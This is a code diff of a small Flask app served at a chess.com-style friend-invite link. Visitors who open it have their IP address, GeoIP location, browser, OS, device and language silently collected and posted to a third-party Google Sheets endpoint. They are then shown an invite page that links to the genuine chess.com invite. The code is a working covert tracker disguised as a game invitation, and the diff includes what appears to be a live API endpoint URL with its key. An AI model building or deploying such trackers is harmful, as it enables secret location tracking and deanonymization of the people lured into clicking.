@@ -1,5 +1,5 @@
-from flask import Flask, request, redirect
-import datetime, json
+from flask import Flask, request, render_template
+import datetime
 import geoip2.database
 import user_agents
 import os
@@ -7,7 +7,6 @@ import requests
 
 app = Flask(__name__)
 
-# Шлях до GeoLite2 бази
 MMDB_URL = os.getenv("MMDB_URL")
 MMDB_PATH = "GeoLite2-City.mmdb"
 
@@ -27,8 +26,15 @@ if not os.path.exists(MMDB_PATH):
 
 geoip_reader = geoip2.database.Reader(MMDB_PATH)
 
-@app.route("/friend/<ref>")
-def chess_friend(ref):
+
+NOCODE_API_URL = "https://v1.nocodeapi.com/mrgrinder/google_sheets/bWHFqPYyBfrPywCF"
+
+def log_to_gsheet(data):
+    r = requests.post(NOCODE_API_URL, json=[data])
+    r.raise_for_status()
+
+@app.route("/invite/friend/<ref>")
+def chess_invite(ref):
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ua_string = request.headers.get("User-Agent")
     ua = user_agents.parse(ua_string)
@@ -52,19 +58,12 @@ def chess_friend(ref):
         "os": ua.os.family + " " + ua.os.version_string,
         "device": ua.device.family,
         "accept_lang": request.headers.get("Accept-Language"),
+        "invite_ref": ref,
     }
 
-    with open("tracker_log.json", "a") as f:
-        f.write(json.dumps(data, ensure_ascii=False) + "\n")
+    log_to_gsheet(data)   # <--- ВИКЛИК функції
 
-    if "Android" in ua.os.family:
-        return redirect("https://play.google.com/store/apps/details?id=com.chess", code=302)
-
-    elif "iOS" in ua.os.family or "iPhone" in ua.device.family or "iPad" in ua.device.family:
-        return redirect("https://apps.apple.com/us/app/chess-play-learn/id329218549", code=302)
-
-    else:
-        return redirect(f"https://link.chess.com/friend/{ref}", code=302)
+    return render_template("invite.html", invite_link=f"https://link.chess.com/friend/{ref}")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
